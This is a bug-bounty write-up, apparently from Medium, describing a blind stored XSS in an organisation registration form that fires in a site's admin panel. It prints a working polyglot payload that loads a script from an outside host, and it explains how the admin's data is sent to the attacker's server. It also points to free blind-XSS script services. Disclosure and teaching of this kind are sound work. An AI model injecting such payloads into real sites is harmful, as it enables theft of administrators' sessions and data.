# Discovering Two Out-of-Scope Blind/Stored XSS Vulnerabilities in an Admin Panel on a Public Bug…

- **Source URL:** https://medium.com/@octayus/discovering-two-out-of-scope-blind-stored-xss-vulnerabilities-in-an-admin-panel-on-a-public-bug-c0262fa35238?source=rss------bug_bounty-5
- **Fetched from:** https://medium.com/feed/@octayus
- **Fetched:** 2026-11-19
- **Channel:** @dailybountywriteup
- **Telegram message:**  (id 7098)
- **Method:** medium-rss-content readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
### Discovering Two Out-of-Scope Blind/Stored XSS Vulnerabilities in an Admin Panel on a Public Bug Bounty Program

#### Note:

Due to privacy and program restrictions, I can’t share reproduction screenshots or videos, but I’ll provide all necessary details for a clear understanding.

### Vulnerability Overview

I identified a stored Cross-Site Scripting (XSS) vulnerability within the Contact form at https://redacted.com/register/organisation. The vulnerability arises because the form doesn’t properly sanitize user input, allowing an attacker to submit malicious code. I successfully exploited this by inserting a blind XSS payload, which was later triggered in the admin panel at [https://redacted.com/Admin/Organisation.aspx?id=9384628.](https://redacted.com/Admin/Organisation.aspx?id=9384628.)

— — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — -

### Steps to Reproduce

**Attacker Actions:**

1. **Sign Up:**

- Visit [https://redacted.com.](https://redacted.com.)
- Click on the “Employer Login” button.
- Create an account on the employee portal.

**2. Submit a Malicious Organisation Request:**

- After logging in, submit a request to register a new organisation via the form at [https://redacted.com/register/organisation.](https://redacted.com/register/organisation.)
- Enter a malicious XSS payload in the form:

`'OR+1=1-{{7*7}}<script src="https://X55.is?1=18722"></script>`
- Submit the Form.

**Victim (Admin) Actions:**

1. **Log into Admin Panel:**

- An administrator logs into the backend of the website.
- The XSS payload is triggered when the admin views the Organisation page at [https://redacted.com/Admin/Organisation.aspx?id=9384628.](https://redacted.com/Admin/Organisation.aspx?id=9384628.)

### Additional Information for Newbies

- **Blind XSS:** Unlike regular XSS, blind XSS doesn’t immediately show results to the attacker. Instead, the payload is stored and executed later when the target (the admin) views it.
- **Payload:** The script you input into the form doesn’t fire immediately. It waits until an admin views the organisation submission, at which point the malicious script executes in their browser, and the data is sent to your server.
- **Tools:** Tools like [Burp Suite](https://portswigger.net/burp) are useful for intercepting and modifying requests. You can use them to inject payloads into forms that may not allow direct script input.
- **Video Proof:** Recording your steps and creating a video proof of concept (POC) can be helpful to demonstrate how you achieved the attack, clarifying the process and the vulnerability’s exploitation.
- **BXSS, KNOXSS:** Both are good and provides FREE blind XSS Scripts.

**Connect with me on Twitter:**
